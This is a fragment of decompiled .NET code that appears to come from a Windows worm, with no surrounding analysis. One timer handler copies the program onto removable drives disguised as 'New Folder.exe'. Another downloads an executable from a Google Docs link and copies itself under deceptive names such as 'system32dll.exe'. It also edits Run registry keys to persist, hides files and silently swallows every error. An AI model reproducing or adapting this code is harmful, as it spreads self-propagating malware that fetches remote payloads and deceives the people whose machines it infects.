	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Timer6_Tick(object sender, EventArgs e)
	{
		Timer6.Stop();
		checked
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				int num = drives.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					if ((double)drives[num2].DriveType == Conversions.ToDouble("2"))
					{
						string[] directories = Directory.GetDirectories(drives[num2].Name);
						int num5 = 0;
						if (0 < directories.Length)
						{
							string text = directories[num5];
							if (!File.Exists(text + "\\New Folder.exe"))
							{
								FileSystem.FileCopy(Application.get_ExecutablePath(), text + "\\New Folder.exe");
							}
						}
					}
					num2++;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Timer6.Start();
		}
	}

	private void timerupdate_Tick(object sender, EventArgs e)
	{
		timerupdate.Stop();
		try
		{
			if (File.Exists(lblfilename.get_Text() + "WineList.exe"))
			{
				File.Delete(lblfilename.get_Text() + "WineList.exe");
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://doc-04-38-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/imhga88fsgkunlpnirk71iam53e4toqp/1400068800000/07351823439849465943/*/0BzyogDpX4By2VlR3VmswSlAtZk0?h=16653014193614665626&e=download", lblfilename.get_Text() + "WineList.exe");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string fileVersion = FileVersionInfo.GetVersionInfo(lblfilename.get_Text() + "WineList.exe").FileVersion;
			try
			{
				string fileVersion2 = FileVersionInfo.GetVersionInfo(Application.get_ExecutablePath()).FileVersion;
				if (!fileVersion.Equals(fileVersion2))
				{
					FileStream fileStream = new FileStream(lblfilename.get_Text() + "fv.rj", FileMode.Create, FileAccess.Write);
					StreamWriter streamWriter = new StreamWriter(fileStream);
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					streamWriter.WriteLine(fileVersion);
					streamWriter.Close();
					fileStream.Close();
					hidefile(lblfilename.get_Text() + "fv.rj");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			string executablePath = Application.get_ExecutablePath();
			executablePath = Path.GetDirectoryName(executablePath);
			if (executablePath.Equals(lblfilename.get_Text()))
			{
				File.Copy("", lblfilename.get_Text() + "Windows\\windows.exe", overwrite: true);
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("system32dll");
			}
			else if (executablePath.Equals(lblfilename.get_Text() + "Windows"))
			{
				File.Copy("", lblfilename.get_Text() + "system32dll.exe", overwrite: true);
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("windows");
			}
			((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(lblfilename.get_Text() + "fv.rj");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
